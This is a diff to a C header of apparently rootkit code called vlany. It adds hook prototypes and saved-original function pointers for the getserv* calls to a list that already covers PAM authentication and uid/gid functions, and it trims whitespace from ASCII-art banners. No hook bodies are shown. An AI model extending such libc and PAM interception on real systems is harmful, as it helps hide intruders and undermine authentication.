@@ -1,12 +1,12 @@
 /*
- *    __                  _   _                               _        _                         
- *   / _|                | | (_)                             | |      | |                        
- *  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
+ *    __                  _   _                               _        _
+ *   / _|                | | (_)                             | |      | |
+ *  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___
  *  |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
  *  | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
  *  |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
- *                                           | |                            __/ | |              
- *                                           |_|                           |___/|_|              
+ *                                           | |                            __/ | |
+ *                                           |_|                           |___/|_|
  *
  *    This file contains all of the required function prototypes for vlany. All created prototypes are
  *    modified by vlany. The location of each modification can be found above each section of prototypes.
@@ -16,7 +16,7 @@
  *        int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);
  *        int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags);
  *    So the rename*() functions hooked by vlany are located in "./symbols/rename/".
- *    
+ *
  *    -Wno-comment (thanks gcc for making my life an unnecessary misery)
  *    The locations of the man pages for every function are located in vlany.c.
  */
@@ -149,6 +149,11 @@ int pam_authenticate(pam_handle_t *pamh, int flags);
 int pam_open_session(pam_handle_t *pamh, int flags);
 int pam_acct_mgmt(pam_handle_t *pamh, int flags);
 
+// symbols/servent/*
+struct servent *getservent(void);
+struct servent *getservbyname(const char *name, const char *proto);
+struct servent *getservbyport(int port, const char *proto);
+
 // symbols/gid/*
 int setgid(gid_t gid);
 int setegid(gid_t egid);
@@ -163,27 +168,27 @@ struct passwd *getpwent(void);
 int getpwnam_r(const char *name, struct passwd *pwd, char *buf, size_t buflen, struct passwd **result);
 
 /*
- *                  _          __    __                  _   _                               _        _                         
- *                 | |        / _|  / _|                | | (_)                             | |      | |                        
- *    ___ _ __   __| |   ___ | |_  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
+ *                  _          __    __                  _   _                               _        _
+ *                 | |        / _|  / _|                | | (_)                             | |      | |
+ *    ___ _ __   __| |   ___ | |_  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___
  *   / _ \ '_ \ / _` |  / _ \|  _| |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
  *  |  __/ | | | (_| | | (_) | |   | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
  *   \___|_| |_|\__,_|  \___/|_|   |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
- *                                                                          | |                            __/ | |              
- *                                                                          |_|                           |___/|_|              
+ *                                                                          | |                            __/ | |
+ *                                                                          |_|                           |___/|_|
  */
 
 
 
 /*
- *         _     _    __                  _   _                               _        _                         
- *        | |   | |  / _|                | | (_)                             | |      | |                        
- *    ___ | | __| | | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
+ *         _     _    __                  _   _                               _        _
+ *        | |   | |  / _|                | | (_)                             | |      | |
+ *    ___ | | __| | | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___
  *   / _ \| |/ _` | |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
  *  | (_) | | (_| | | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
  *   \___/|_|\__,_| |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
- *                                                           | |                            __/ | |              
- *                                                           |_|                           |___/|_|              
+ *                                                           | |                            __/ | |
+ *                                                           |_|                           |___/|_|
  *
  *  Below all I'm doing is creating prototypes of symbols by using typeof() so that I can reference the old library
  *  functions in the new functions that I'm hooking. Using typeof() literally just saves me time. It's for me. Not you.
@@ -299,6 +304,10 @@ typeof(pam_authenticate) *old_pam_authenticate;
 typeof(pam_open_session) *old_pam_open_session;
 typeof(pam_acct_mgmt) *old_pam_acct_mgmt;
 
+typeof(getservent) *old_getservent;
+typeof(getservbyname) *old_getservbyname;
+typeof(getservbyport) *old_getservbyport;
+
 typeof(setgid) *old_setgid;
 typeof(setegid) *old_setegid;
 typeof(setregid) *old_setregid;
@@ -311,12 +320,12 @@ typeof(getpwent) *old_getpwent;
 typeof(getpwnam_r) *old_getpwnam_r;
 
 /*
- *                  _          __         _     _   _ _ _             __                  _   _                               _        _                         
- *                 | |        / _|       | |   | | | (_) |           / _|                | | (_)                             | |      | |                        
- *    ___ _ __   __| |   ___ | |_    ___ | | __| | | |_| |__   ___  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___ 
+ *                  _          __         _     _   _ _ _             __                  _   _                               _        _
+ *                 | |        / _|       | |   | | | (_) |           / _|                | | (_)                             | |      | |
+ *    ___ _ __   __| |   ___ | |_    ___ | | __| | | |_| |__   ___  | |_ _   _ _ __   ___| |_ _  ___  _ __    _ __  _ __ ___ | |_ ___ | |_ _   _ _ __   ___  ___
  *   / _ \ '_ \ / _` |  / _ \|  _|  / _ \| |/ _` | | | | '_ \ / __| |  _| | | | '_ \ / __| __| |/ _ \| '_ \  | '_ \| '__/ _ \| __/ _ \| __| | | | '_ \ / _ \/ __|
  *  |  __/ | | | (_| | | (_) | |   | (_) | | (_| | | | | |_) | (__  | | | |_| | | | | (__| |_| | (_) | | | | | |_) | | | (_) | || (_) | |_| |_| | |_) |  __/\__ \
  *   \___|_| |_|\__,_|  \___/|_|    \___/|_|\__,_| |_|_|_.__/ \___| |_|  \__,_|_| |_|\___|\__|_|\___/|_| |_| | .__/|_|  \___/ \__\___/ \__|\__, | .__/ \___||___/
- *                                                                                                           | |                            __/ | |              
- *                                                                                                           |_|                           |___/|_|              
+ *                                                                                                           | |                            __/ | |
+ *                                                                                                           |_|                           |___/|_|
  */
